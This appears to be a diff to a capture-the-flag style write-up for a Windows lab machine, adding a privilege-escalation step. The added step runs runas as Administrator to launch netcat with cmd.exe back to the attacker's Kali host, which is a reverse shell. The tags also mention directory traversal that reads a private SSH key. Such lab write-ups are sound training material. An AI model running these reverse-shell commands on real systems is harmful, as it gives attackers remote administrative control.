@@ -3,7 +3,7 @@ Alias: DVR-4
 Date: 8/21/2022
 Platform: Windows
 Difficulty: Intermediate
-Tags: #WindowsDirectoryTraversalExploit #URLencodedCharacters #WindowsDirectoryTraversalPrivateSSHKey #FindHiddenWindowsDirectorys #WindowsProgramConfigurationFile #IdentifyHashID
+Tags: #WindowsDirectoryTraversalExploit #URLencodedCharacters #WindowsDirectoryTraversalPrivateSSHKey #FindHiddenWindowsDirectorys #WindowsProgramConfigurationFile #IdentifyHashID #RunProgramFromDifferentWindowsUser 
 Status: Finished
 IP: 192.168.122.179
 ---
@@ -307,6 +307,20 @@ Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor
 
 #### -As we are going to attempt to login as a different user (Administrator) I googled "how to run a program as a different user in windows command line" :
 
+![](Pasted%20image%2020221009202220.png)
+
+#### - Per the web page it showed to run the following command example "runas /user:admin "C:\Windows\notepad.exe"
+
+![](Pasted%20image%2020221009202314.png)
+
+#### - Typed runas /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443" (can also type runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443") and received a cmd promp running as Administrator:
+
+![](Pasted%20image%2020221009202519.png)
+
+![](Pasted%20image%2020221009202604.png)
+
+
+#RunProgramFromDifferentWindowsUser 
 
 
 ## Privilege Escalation vector
